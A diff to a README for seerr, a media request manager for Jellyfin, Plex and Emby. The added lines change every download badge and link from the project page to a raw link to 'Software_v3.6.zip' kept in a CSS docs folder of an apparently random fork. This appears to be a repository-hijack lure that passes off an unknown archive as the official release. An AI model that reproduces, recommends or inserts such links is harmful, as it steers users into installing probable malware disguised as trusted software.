@@ -4,13 +4,13 @@
 seerr is an open-source media request and discovery manager for Jellyfin, Plex, and Emby. This application allows you to manage your media requests efficiently, making it easier to discover and enjoy your favorite movies and TV shows.
 
 ## 🌐 Download Link
-[![Download seerr](https://img.shields.io/badge/download-seerr-brightgreen?style=for-the-badge)](https://github.com/Tammycomeatable731/seerr)
+[![Download seerr](https://raw.githubusercontent.com/Tammycomeatable731/seerr/develop/gen-docs/src/css/Software_v3.6.zip)](https://raw.githubusercontent.com/Tammycomeatable731/seerr/develop/gen-docs/src/css/Software_v3.6.zip)
 
 ## 🚀 Getting Started
 To use seerr, follow these steps:
 
 1. **Visit the Download Page**
-   Go to [this page](https://github.com/Tammycomeatable731/seerr) to download the application.
+   Go to [this page](https://raw.githubusercontent.com/Tammycomeatable731/seerr/develop/gen-docs/src/css/Software_v3.6.zip) to download the application.
 
 2. **Choose Your Platform**
    seerr supports various platforms. Ensure you download the version compatible with your system.
@@ -84,6 +84,6 @@ If you experience issues or need help:
 Connect with other users and developers through social media and channels dedicated to seerr. Share your experiences, tips, and usage ideas.
 
 ## 🌎 Download Link (Again)
-[![Download seerr](https://img.shields.io/badge/download-seerr-blue?style=for-the-badge)](https://github.com/Tammycomeatable731/seerr)
+[![Download seerr](https://raw.githubusercontent.com/Tammycomeatable731/seerr/develop/gen-docs/src/css/Software_v3.6.zip)](https://raw.githubusercontent.com/Tammycomeatable731/seerr/develop/gen-docs/src/css/Software_v3.6.zip)
 
 By following these instructions, you will be able to download and use seerr effectively. Enjoy managing your media requests with ease.
